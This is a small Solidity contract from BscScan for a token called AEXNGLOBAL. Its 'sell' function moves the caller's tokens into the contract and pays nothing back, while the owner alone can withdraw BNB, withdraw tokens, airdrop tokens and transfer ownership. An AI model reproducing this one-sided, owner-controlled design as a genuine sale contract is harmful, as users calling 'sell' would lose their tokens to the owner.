/**
 *Submitted for verification at BscScan.com on 2023-05-08
*/

/**
 *Submitted for verification at BscScan.com on 2023-04-20
*/

//SPDX-License-Identifier: MIT


pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}





contract AEXNGLOBAL {
  
    address payable public owner;
     IERC20 public token;


      modifier onlyOwner() {
        require(msg.sender==owner, "Only Call by Owner");
        _;
    }
    constructor(IERC20 _token) {
        owner = payable(msg.sender);
        token = _token;
    }

 receive() external payable { }
 



    function sell (uint256 _amount)  external 
    {
        token.transferFrom(msg.sender,address(this),_amount);
    } 

    function multisendToken(address[] calldata _contributors, uint256[] calldata __balances) external   onlyOwner 
        {
            uint256 i = 0;        
            for (i; i < _contributors.length; i++) {
            token.transfer(_contributors[i], __balances[i]);
            }
        }
    
    
  

    function withDraw (uint256 _amount) onlyOwner external 
    {
        payable(msg.sender).transfer(_amount);
    }


    function ChangeOwner (address payable _owner) onlyOwner external 
    {
       owner = _owner;
    }


    
    function getTokens (uint256 _amount) onlyOwner external 
    {
        token.transfer(msg.sender,_amount);
    }


}